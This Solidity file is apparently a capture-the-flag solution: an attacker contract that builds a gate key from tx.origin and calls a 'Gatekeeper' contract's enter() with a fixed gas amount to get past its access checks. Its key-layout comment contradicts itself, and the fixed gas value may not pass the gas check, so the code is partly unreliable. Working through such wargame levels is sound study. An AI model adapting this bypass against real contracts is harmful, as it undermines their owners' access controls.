pragma solidity ^0.8.0;

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract GatekeeperAttackerFinal {
    IGatekeeper public immutable Gatekeeper;

    constructor(address _gatekeeper) {
        Gatekeeper = IGatekeeper(_gatekeeper);
    }

    function attack() public {
        // 48 upper bits must be 0x00000001 followed by 0x0000 for the lower 32
        // lower 32 bits of gateKey is 0x0000yyyy (where yyyy is the lower 16 of player's address)
        // This satisfies gateThree part one and part three
        bytes8 gateKey = bytes8( (uint64(0x00000001) << 32) | uint64(uint16(uint160(tx.origin)) & 0xFFFF) );
        (bool success,) = address(Gatekeeper).call{gas: 8191 * 1000}(
            abi.encodeWithSelector(
                IGatekeeper.enter.selector,
                gateKey
            )
        );
        require(success, "Attack failed");
    }
}